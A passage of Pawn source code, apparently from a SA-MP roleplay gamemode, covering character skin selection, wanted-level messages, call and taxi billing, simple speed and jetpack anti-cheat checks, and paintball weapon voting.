    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 215;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 117:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 220);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 220;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 118:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 221);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 221;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 119:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 222);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 222;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 120:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 224);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 224;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 121:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 229);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 229;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 122:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 230);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 230;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 123:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 231);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 231;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 124:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 232);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 232;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 125:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 234);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 234;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 126:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 235);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 235;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 127:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 236);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 236;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 128:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 239);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 239;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 129:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 241);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 241;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 130:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 242);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 242;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 131:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 254);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 254;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 132:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 258);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 258;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 133:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 260);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 260;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 134:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 262);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 262;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 135:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 264);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 264;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 136:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 273);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 273;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 137:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 293);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 293;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 138:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 297);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 297;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 139:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 299);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 299;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    }
    SaveKonVal(playerid, "cSkin", PINFO[playerid][cSkin]);
    }
    }
    return 1;
}



/*public OnLoadWeb(playerid) {

	PlayerInfo[playerid][pGetWeb] = cache_get_row_int(0,183,handle);

	if(PINFO[playerid][pGetWeb] == 1) {
	PINFO[playerid][pGetWeb] = 0;
	SaveKonVal(playerid, "pGetWeb", 0);

	PlayerInfo[playerid][pMember] = cache_get_row_int(0,32,handle),
	PlayerInfo[playerid][pPunish] = cache_get_row_int(0,33,handle),
	PlayerInfo[playerid][pFwarn] = cache_get_row_int(0,34,handle),
	PlayerInfo[playerid][pRank] = cache_get_row_int(0,35,handle),
	PlayerInfo[playerid][fSkin] = cache_get_row_int(0,37,handle),
	PlayerInfo[playerid][pTeam] = cache_get_row_int(0,46,handle);
	MedicBill[playerid] = 0;
	ResetPlayerTofang(playerid);
	SetSpawnKol(playerid);
	SpawnPlayer(playerid);
	new string[512];
	format(string, sizeof(string), "You have been kicked from your Family / Faction by Leader for %d fpunish. [UCP]",PINFO[playerid][pPunish]);
	SendMessage(playerid, COLOR_LIGHTRED, string);
	SendMessage(playerid, COLOR_LIGHTBLUE, "You are now a Civilian again.");
	MedicBill[playerid] = 0;
	ResetPlayerTofang(playerid);
	SetSpawnKol(playerid);
	SpawnPlayer(playerid);
	}
	if(PINFO[playerid][pGetWeb] > 199) {


	PlayerInfo[playerid][pGold] += PINFO[playerid][pGetWeb];
	SaveKonVal(playerid, "pGold", PlayerInfo[playerid][pGold]);

	new str[512];
	format(str, sizeof(str), "You bought %d golds from gold shop successfully.",PlayerInfo[playerid][pGetWeb]);
	SendMessage(playerid, COLOR_AMIR, str);

	PINFO[playerid][pGetWeb] = 0;
	SaveKonVal(playerid, "pGetWeb", 0);
	}
}*/



public OnPlayerRequestSpawn(playerid)
{
    if(gPlayerLogged[playerid] != 1) {return 0;}
    MedicBill[playerid] = 0;
    PlayerFahmid[playerid] = 0;
    return 1;
}

public SetPlayerCriminal(playerid, declare, reason[], WantedBealave)
{
    if(IsPlayerConnected(playerid))
    {
        PlayerInfo[playerid][pCrimes] += 1;
        SaveKonVal(playerid, "pCrimes", PINFO[playerid][pCrimes]);
        new points = GetPlayerWantedLevel(playerid),turner[MAX_PLAYER_NAME],turnmes[256],wantedmes[128];
        if(declare != INVALID_PLAYER_ID) GetPlayerName(declare,turner,sizeof turner);
        else turner = "Unknown";
        format(turnmes, sizeof(turnmes), "Shoma Tavasote Police %s, +%d Wanted Daryaft Kardid. Dalil: %s",turner,WantedBealave,reason);
        SendClientMessage(playerid, COLOR_LIGHTRED, turnmes);
        if(points > -1)
        {
            new yesno = 1;
            if(points > 6) yesno = 0;
            if(yesno == 1)
            {
                format(wantedmes, sizeof(wantedmes), "Darajeye Khalafi Shoma : %d", points);
                SendClientMessage(playerid, COLOR_YELLOW, wantedmes);
                for(new i = 0; i < LastPID; i++)
                {
                    if(IsPlayerConnected(i))
                    {
                        if(PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pLeader] == 1 || PlayerInfo[i][pMember] == 2 || PlayerInfo[i][pLeader] == 2 || PlayerInfo[i][pMember] == 3 || PlayerInfo[i][pLeader] == 3 || PlayerInfo[i][pMember] == 20 || PlayerInfo[i][pLeader] == 20)
                        {
                            format(turnmes, sizeof(turnmes), "HQ: All Units APB: Reporter: %s | Crime: %s, Suspect: %s",turner,reason,PlayerName(playerid));
                            SendClientMessage(i, TEAM_BLUE_COLOR, turnmes);
                        }
                    }
                }
            }
        }
    }
}
//---------------------------------------------------------

public SetPlayerFree(playerid,declare,reason[])
{
    if(IsPlayerConnected(playerid))
    {
        new turned[MAX_PLAYER_NAME];
        new turner[MAX_PLAYER_NAME];
        new turnmes[128];
        new crbjstore[128];
        if (declare == 255)
        {
            format(turner, sizeof(turner), "110");
        }
        else
        {
            if(IsPlayerConnected(declare))
            {
                GetPlayerName(declare, turner, sizeof(turner));
            }
        }
        GetPlayerName(playerid, turned, sizeof(turned));
        format(turnmes, sizeof(turnmes), "SMS: %s, Because you %s, you are no longer a Criminal, Sender: MOLE (555)",turned,reason);
        SendClientMessage(playerid, COLOR_YELLOW, turnmes);
        for(new i = 0; i < LastPID; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(PlayerInfo[i][pMember] == 1||PlayerInfo[i][pLeader] == 1)
                {
                    format(crbjstore, sizeof(crbjstore), "HQ: All Units Officer %s Has Completed Assignment",turner);
                    SendClientMessage(i, COLOR_DBLUE, crbjstore);
                    format(crbjstore, sizeof(crbjstore), "HQ: %s Has Been Processed, %s",turned,reason);
                    SendClientMessage(i, COLOR_DBLUE, crbjstore);
                }
            }
        }
    }
}

/*--------------------------------**PD**--------------------------------*/
/*Developer*/
public OtherTimer()
{
    new string[256];
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
			if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
			{
				if(OwnedMashin[GetPlayerVehicleID(i)] == 1 && PlayerInfo[MashinOwner[GetPlayerVehicleID(i)]][cLock] == 0) TextDrawSetString(DoorsLockTextDraw[i], "Doors: ~g~Unlock");
				if(OwnedMashin_2[GetPlayerVehicleID(i)] == 1 && PlayerInfo[MashinOwner[GetPlayerVehicleID(i)]][cLock] == 1) TextDrawSetString(DoorsLockTextDraw[i], "Doors: ~r~Lock");
				if(OwnedMashin_2[GetPlayerVehicleID(i)] == 1 && PlayerInfo[MashinOwner_2[GetPlayerVehicleID(i)]][cLock] == 0) TextDrawSetString(DoorsLockTextDraw2[i], "Doors: ~g~Unlock");
				if(OwnedMashin_2[GetPlayerVehicleID(i)] == 1 && PlayerInfo[MashinOwner_2[GetPlayerVehicleID(i)]][cLock] == 1) TextDrawSetString(DoorsLockTextDraw2[i], "Doors: ~r~Lock");
			}
			SetPlayerToTeamColor(i);
			if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
			{
			    new Float:health,pVeh=GetPlayerVehicleID(i);
				GetVehicleHealth(pVeh, health);
				if(health < vHealth[pVeh]) vHealth[pVeh] =health;
				if(health > vHealth[pVeh]) SetVehicleHealth(pVeh,vHealth[pVeh]);
			}
			if(AirTime[i] == 2)
			{
			    GetPlayerPos(i,pPosX[i],pPosY[i],pPosZ[i]);
				AirTime[i] =1;
			}
			else if(AirTime[i] == 1)
			{
				if(!IsPlayerInAnyVehicle(i) && !IsPlayerInRangeOfPoint(i,60.0,pPosX[i],pPosY[i],pPosZ[i]))
				{
					//format(string, sizeof(string), "* %s(%d) Cheating AirBreak On Foot",PlayerName(i),i);
					//SendAdminMessage(COLOR_GG, string);
				}
				if(IsPlayerInAnyVehicle(i) && !IsPlayerInRangeOfPoint(i,80.0,pPosX[i],pPosY[i],pPosZ[i]))
				{
					//format(string, sizeof(string), "* %s(%d) Cheating AirBreak On Vehicle",PlayerName(i),i);
					//SendAdminMessage(COLOR_GG, string);
				}
				AirTime[i] =2;
			}
			if(GetPlayerSpecialAction(i) == SPECIAL_ACTION_USEJETPACK && HaveJetpack[i] != 1) KickAntiCheat(i,"Jetpack Hack");
            if(CellTime[i] != 90)
            {
                CellTime[i] ++;
                if (CellTime[i] >= cchargetime)
                {
                    CellTime[i] = 0;
                    if(Mobile[i] != 9999)
                    {
                        if(Mobile[Mobile[i]] == i)
                        {
                            CallCost[i] += SBizzInfo[14][sbEntranceCost];
                        }
                        else
                        {
                            SendClientMessage(i,  COLOR_PURPLE, "The line just went dead ....");
                            SetPlayerSpecialAction(i, SPECIAL_ACTION_STOPUSECELLPHONE);
                            RemovePlayerAttachedObject(i, 0);
                            CellTime[i] = 90;
                            CellTime[Mobile[i]] = 90;
                            Mobile[Mobile[i]] = 9999;
                            TimerRingTone[Mobile[i]] = 0;
                            CallWaiting[Mobile[i]] = 9999;
                            Mobile[i] = 9999;
                            PlayerInfo[i][pSpeaker] = 0;//Nemikhad save she
                        }
                    }
                }
            }
            if(CellTime[i] == 90 && CallCost[i] > 0)
            {
                format(string, sizeof(string), "~w~The call cost~n~~r~$%d",CallCost[i]);
                GameTextForPlayer(i, string, 5000, 1);
                GivePlayerPool(i, -CallCost[i]);
                SBizzInfo[14][sbTill] += CallCost[i];
                CallCost[i] = 0;
            }
            if(TransportTime[i] > 0)
            {//Taxi driver and passenger only
                if(TransportTime[i] >= 16)
                {
                    TransportTime[i] = 1;
                    if(TransportDriver[i] < INVALID_PLAYER_ID)
                    {
                        if(IsPlayerConnected(TransportDriver[i]))
                        {
                            TransportCost[i] += TransportValue[TransportDriver[i]];
                            TransportCost[TransportDriver[i]] = TransportCost[i];
                        }
                    }
                }
                TransportTime[i] += 1;
                format(string, sizeof(string), "~r~%d ~w~: ~g~$%d",TransportTime[i],TransportCost[i]);
                GameTextForPlayer(i, string, 15000, 6);
            }
        }
    }
    return 1;
}

Public:UnSentCheating(playerid)
{
    Cheating2[playerid] = 0;
    return 1;
}
Public:UnSentCheatingNex(playerid)
{
    Cheating2Nex[playerid] = 0;
    return 1;
}

/*TestMod*/
public SPeedKm()
{
	for(new i = 0; i < LastPID; i++)
	{
		new tmpcar = GetPlayerVehicleID(i),vehicleid,Float:speed_x,Float:speed_y,Float:speed_z,Float:final_speed,speed_string[256],final_speed_int;
		vehicleid = GetPlayerVehicleID(i);
    if(!IsAPlane(tmpcar))
    {
    if(vehicleid != 0)
    {
    GetPlayerPos(i, TelePos[i][3], TelePos[i][4], TelePos[i][5]);
                if(TelePos[i][5] > 550.0)
                {
                    TelePos[i][0] = 0.0;
                    TelePos[i][1] = 0.0;
                }
                if(TelePos[i][0] != 0.0)
                {
        GetVehicleVelocity(vehicleid,speed_x,speed_y,speed_z);
        final_speed = floatsqroot(((speed_x*speed_x)+(speed_y*speed_y)))*180.0;
        final_speed_int = floatround(final_speed,floatround_round);
        format(speed_string,256,"Speed: %i Km/h",final_speed_int);
        TextDrawSetString(SpeedoTextDraw[i], speed_string);
                }
                GetPlayerPos(i, TelePos[i][3], TelePos[i][4], TelePos[i][5]);
                if(TelePos[i][5] > 550.0)
                {
                    TelePos[i][0] = 0.0;
                    TelePos[i][1] = 0.0;
                }
                if(TelePos[i][0] != 0.0)
                {
        GetVehicleVelocity(vehicleid,speed_x,speed_y,speed_z);
        final_speed = floatsqroot(((speed_x*speed_x)+(speed_y*speed_y)))*180.0;
        final_speed_int = floatround(final_speed,floatround_round);
        format(speed_string,256,"Speed: %i Km/h",final_speed_int);
        TextDrawSetString(SpeedoTextDraw[i], speed_string);
                }
                if(TelePos[i][5] < 550.0 && TelePos[i][3] != 0.0)
                {
                    TelePos[i][0] = TelePos[i][3];
                    TelePos[i][1] = TelePos[i][4];
                }
    }
    new string[256];
    new plname[MAX_PLAYER_NAME];
                        if(final_speed_int > 240 && Cheating2[i] != 1)
                        {
                            if(!IsAPlane(tmpcar))
                            {
                                new playerveh = GetPlayerVehicleID(i);
                                new vehicles = GetVehicleModel(playerveh) - 400;
                                GetPlayerName(i, plname, sizeof(plname));
                                if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
                                format(string, 256, "[Anti-Cheat]: {FFFFFF}Server detected an speed hack on {57e547}%s(%i){FFFFFF} (%i km/h) with vehicleid %i(%s).",plname,i,final_speed_int,playerveh,aVehicleNames[vehicles]);
                                ABroadCast(COLOR_GG,string,1); }
                                Cheating2[i] = 1;
                                SetTimerEx("UnSentCheating",5000,0,"i",i);
                            }
                        }
    }
    if(IsAPlane(tmpcar))
    {
    if(vehicleid != 0)
    {
    GetPlayerPos(i, TelePos[i][3], TelePos[i][4], TelePos[i][5]);
                if(TelePos[i][5] > 550.0)
                {
                    TelePos[i][0] = 0.0;
                    TelePos[i][1] = 0.0;
                }
                if(TelePos[i][0] != 0.0)
                {
        GetVehicleVelocity(vehicleid,speed_x,speed_y,speed_z);
        final_speed = floatsqroot(((speed_x*speed_x)+(speed_y*speed_y))+(speed_z*speed_z))*180.0;
        final_speed_int = floatround(final_speed,floatround_round);
        format(speed_string,256,"Speed: %i Km/h",final_speed_int);
        TextDrawSetString(SpeedoTextDraw[i], speed_string);
                }
                GetPlayerPos(i, TelePos[i][3], TelePos[i][4], TelePos[i][5]);
                if(TelePos[i][5] > 550.0)
                {
                    TelePos[i][0] = 0.0;
                    TelePos[i][1] = 0.0;
                }
                if(TelePos[i][0] != 0.0)
                {
        GetVehicleVelocity(vehicleid,speed_x,speed_y,speed_z);
        final_speed = floatsqroot(((speed_x*speed_x)+(speed_y*speed_y))+(speed_z*speed_z))*180.0;
        final_speed_int = floatround(final_speed,floatround_round);
        format(speed_string,256,"Speed: %i Km/h",final_speed_int);
        TextDrawSetString(SpeedoTextDraw[i], speed_string);
                }
                if(TelePos[i][5] < 550.0 && TelePos[i][3] != 0.0)
                {
                    TelePos[i][0] = TelePos[i][3];
                    TelePos[i][1] = TelePos[i][4];
                }
    }
    }
}
return 1;
}
public SetPlayerUnjail()
{
    if(PTime >= 1)
    {
        PTime --;
        if(PTime == 0)
        {
            new loOoL;
            if(PaintBallPlayers <= 3) loOoL = 1;
            for(new i;i<LastPID;i++)
            {
                if(IsPlayerConnected(i))
                {
                    if(OnPaintBall[i] != 0)
                    {
                        if(loOoL == 1) {StopPaintBalling();SCM(i,COLOR_ALI,"Paintball doesn't start, because this match hasen't enough players(4 players need).");}
                        else
                        {
                            TogglePlayerControllable(i,1);
                            PaintBallStarting = 0;
                            PaintballStarted = 1;
														if(pbdg > pbsl && pbdg > pbsg && pbdg > pbss && pbdg > pbcs && pbdg > pbmp && pbdg > pbsr && pbdg > pbak && pbdg > pbm4 && pbdg > pbcr)
							{GivePlayerTofang(i, 24, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : Desert Eagle.");}

							else if(pbsl > pbdg && pbsl > pbsg && pbsl > pbss && pbsl > pbcs && pbsl > pbmp && pbsl > pbsr && pbsl > pbak && pbsl > pbm4 && pbsl > pbcr)
							{GivePlayerTofang(i, 23, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : Silence Deagle.");}

							else if(pbsg > pbdg && pbsg > pbsl && pbsg > pbss && pbsg > pbcs && pbsg > pbmp && pbsg > pbsr && pbsg > pbak && pbsg > pbm4 && pbsg > pbcr)
						    {GivePlayerTofang(i, 25, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : Shotgun.");}

					    	else if(pbss > pbdg && pbss > pbsl && pbss > pbsg && pbss > pbcs && pbss > pbmp && pbss > pbsr && pbss > pbak && pbss > pbm4 && pbss > pbcr)
						    {GivePlayerTofang(i, 26, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : Sawnoff Shotgun.");}

					    	else if(pbcs > pbdg && pbcs > pbsl && pbcs > pbss && pbcs > pbsg && pbcs > pbmp && pbcs > pbsr && pbcs > pbak && pbcs > pbm4 && pbcs > pbcr)
						    {GivePlayerTofang(i, 27, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : Combat Shotgun.");}

						    else if(pbmp > pbdg && pbmp > pbsl && pbmp > pbss && pbmp > pbcs && pbmp > pbsg && pbmp > pbsr && pbmp > pbak && pbmp > pbm4 && pbmp > pbcr)
						    {GivePlayerTofang(i, 29, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : MP5.");}

					    	else if(pbsr > pbdg && pbsr > pbsl && pbsr > pbss && pbsr > pbcs && pbsr > pbmp && pbsr > pbsg && pbsr > pbak && pbsr > pbm4 && pbsr > pbcr)
						    {GivePlayerTofang(i, 34, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : Sniper Rifle.");}

						    else if(pbak > pbdg && pbak > pbsl && pbak > pbss && pbak > pbcs && pbak > pbmp && pbak > pbsr && pbak > pbsg && pbak > pbm4 && pbak > pbcr)
						    {GivePlayerTofang(i, 30, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : AK-47.");}

						    else if(pbm4 > pbdg && pbm4 > pbsl && pbm4 > pbss && pbm4 > pbcs && pbm4 > pbmp && pbm4 > pbsr && pbm4 > pbak && pbm4 > pbsg && pbm4 > pbcr)
						    {GivePlayerTofang(i, 31, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : M4.");}

						    else if(pbcr > pbdg && pbcr > pbsl && pbcr > pbss && pbcr > pbcs && pbcr > pbmp && pbcr > pbsr && pbcr > pbak && pbcr > pbm4 && pbcr > pbsg)
						    {GivePlayerTofang(i, 33, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : Country Rifle.");}

						    else {GivePlayerTofang(i, 31, 2000);GivePlayerTofang(i, 27, 2000);SendClientMessage(i, COLOR_BLUE,"Result vote : ==.");}
                            PFTime = 420;
                            SCM(i,COLOR_ALI,"Paint ball has been started!!!");

                        }
                    }
                }
            }
        }
    }
    if(PFTime >= 1)
    {
        PFTime --;
        if(PFTime == 0)
        {
            new record,b;
            for(new i;i<LastPID;i++)
            {
                if(IsPlayerConnected(i))
                {
                    if(OnPaintBall[i] != 0)
                    {
                        if(b == 0) {record = PaintBallKills[i];b = 1;}
                        if(PaintBallKills[i] > record){record = PaintBallKills[i];}
                    }
                }
            }
            for(new i;i<LastPID;i++)
            {
                if(IsPlayerConnected(i))
                {
                    if(OnPaintBall[i] != 0)
                    {
                        ResetPlayerTofang(i);
                        //format(sttr,512,"Paintball finished. Winner is: %s with %i kills",PINFO[winner][pName],record);
                        //SCM(i,COLOR_WHITE,sttr);
                        StopPaintBalling();
                    }
                }
            }
        }
    }




    new string[256];
 for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {








